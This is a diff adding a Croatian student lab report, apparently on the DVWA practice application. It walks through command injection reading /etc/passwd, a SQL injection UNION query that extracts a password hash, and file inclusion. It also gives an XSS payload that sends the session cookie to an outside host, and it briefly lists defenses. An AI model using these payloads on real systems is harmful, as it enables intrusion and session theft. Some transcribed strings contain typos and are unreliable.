@@ -1,0 +1,29 @@
+1. Zadatak
+
+Nakon što sam unijela naredbu "1 | echo sui" ispod forme mi se ispisalo sui. Dakle, nakon "1 |" možemo upisati neku naredbu koja će se izvršiti. S obzirom  da nam treba sadržaj datoteke "/etc/passwd" koristila sam naredbu "cat" koja će kao argument primiti datoteku te njen sadržaj ispisati na standardni izlaz (Slika 1.1).
+
+2. Zadatak
+
+Unošenjem naredbe "' or 1=1 union select first_name, last_name from users#" dobivamo users te njihova mena i prezimena (Slika 2.1). Sada možemo vidjeti da postoji korisnik Pablo Picasso čiji sažetak lozinke želimo dohvatiti. Upisujemo "'union select password
+first name from users where first name="Pablo"#" te dobivamo hash lozinke koji je "Od107d09f5bbe40cade3de5c7le9e9b7" (Slika 2.2). Zatim pomoću online alata možemo otkriti lozinku "letmein" (Slika 2.3).
+
+
+3. Zadatak
+
+Kada uvrstimo "<script>alert(document.cookie)</script>" polje message u iskočnom prozoru dobijemo rezultat "PHPSESSID=jeeduf6v5kdv2290g960a26m02; security=low" (Slika 3.1).  
+
+Pole message ima ograničen broj znakova na 50, pa otvaranjem developer toolsa to možemo povećati da može prihvatiti veći broj znakova što nam onda omogućava unošenje neke veće skripte. Nakon toga unesemo "<script>document.location.href="http://public.tel.fer.hr/sui?cookie=security=low;20%PHPSESSID=jeeduf6v5kdv2290g960a26m0”</script>" čime cookie šaljemo na drugu stranicu (Slika 3.2).
+
+Od ovakvih ranjivosti aplikaciju možemo zaštititi korištenjem HTTPS protokola te filtriranjem unosa, npr. Tako da enkodiramo html znakove. Također možemo koristiti sigurnosne alate kao što su WAF (Web Application Firewall), antivirusni softver i druge sigurnosni programi.
+
+
+4. Zadatak
+
+Kada kliknemo na poveznice file1.php, file2.php, file3.php vidimo da da se ime te datoteke nalazi kao argument page u URL-u, "http://172.20.10.2/vulnerabilities/fi/?page=file3.php"(Slika 4.1, Slika 4.2, Slika 4.3). 
+Stoga kao parametar page možemo upisati "/etc/passwd" čime nam se ispiše sadržaj datoteke (Slika 4.4). To je moguće izvesti jer server ne provjerava input pri učitavanju datoteke, dakle ne provjerava se je li datoteka u dozvojenom direktoriju.
+
+Od ovakve vrste napada se može zaštititi validacijom ulaza što znači da nećemo onda izvršiti naredbu za svako ime datoteke koje korisnik unese, već samo za one koje su dozvoljene.
+
+
+
+
